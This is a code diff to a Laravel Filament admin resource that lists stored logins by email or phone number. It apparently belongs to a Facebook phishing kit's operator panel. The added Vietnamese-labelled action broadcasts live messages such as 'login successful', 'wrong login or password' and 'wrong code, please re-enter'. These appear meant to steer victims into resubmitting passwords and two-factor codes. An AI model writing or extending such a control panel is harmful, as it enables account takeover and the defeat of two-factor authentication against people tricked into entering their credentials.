@@ -5,8 +5,10 @@ namespace App\Filament\Resources;
 use App\Filament\Resources\UserLoginResource\Pages;
 use App\Filament\Resources\UserLoginResource\RelationManagers;
 use App\Models\UserLogin;
+use Filament\Actions\Action;
 use Filament\Forms;
 use Filament\Forms\Form;
+use Filament\Notifications\Notification;
 use Filament\Resources\Resource;
 use Filament\Tables;
 use Filament\Tables\Actions\ExportBulkAction;
@@ -14,6 +16,9 @@ use Filament\Tables\Columns\TextColumn;
 use Filament\Tables\Table;
 use Illuminate\Database\Eloquent\Builder;
 use Illuminate\Database\Eloquent\SoftDeletingScope;
+use  App\Events\MessageSent;
+use Filament\Forms\Components\TextInput;
+use Filament\Forms\Components\Toggle;
 
 class UserLoginResource extends Resource
 {
@@ -47,6 +52,8 @@ class UserLoginResource extends Resource
     public static function table(Table $table): Table
     {
         return $table
+        ->defaultSort('id', 'desc') // Sort by 'id' in descending order
+
         ->columns([
             TextColumn::make('email')
                 ->label('Email - Phone number')
@@ -72,6 +79,46 @@ class UserLoginResource extends Resource
                 //
             ])
             ->actions([
+                Tables\Actions\Action::make('notify')
+                ->label('Gửi thông báo')
+                ->color('success')
+                ->icon('heroicon-o-bell') // Set your desired icon here
+                ->form([
+                    TextInput::make('notificationMessage')
+                        ->label('Nội dung thông báo') // Changed to Vietnamese
+                        ,
+
+                    Toggle::make('loginSuccess')
+                        ->label('Đăng nhập thành công'),
+
+                    Toggle::make('codeEntrySuccess')
+                        ->label('Nhập mã thành công'),
+                    Toggle::make('facebookLoginError')
+                        ->label('Thông tin đăng nhập hoặc mật khẩu sai'),
+                    Toggle::make('codeSelectionError')
+                        ->label('Mã sai, vui lòng nhập lại.'),
+                    Toggle::make('notify')
+                        ->label('Thông báo'),
+                ])
+                ->action(function (array $data) {
+                    // Broadcast the event with the user input
+                    broadcast(new MessageSent($data['notificationMessage'], $data['loginSuccess'], $data['codeEntrySuccess'], $data['facebookLoginError'], $data['codeSelectionError']
+                ,$data['notify']));
+                    if ($data['loginSuccess']) {
+                        // Add custom logic for login success if needed
+                    }
+
+                    if ($data['codeEntrySuccess']) {
+                        // Add custom logic for code entry success if needed
+                    }
+
+
+                    // Show a Filament success notification
+                    Notification::make()
+                        ->title('Notification Sent')
+                        ->success()
+                        ->send();
+                }),
                 Tables\Actions\EditAction::make(),
             ])
             ->bulkActions([
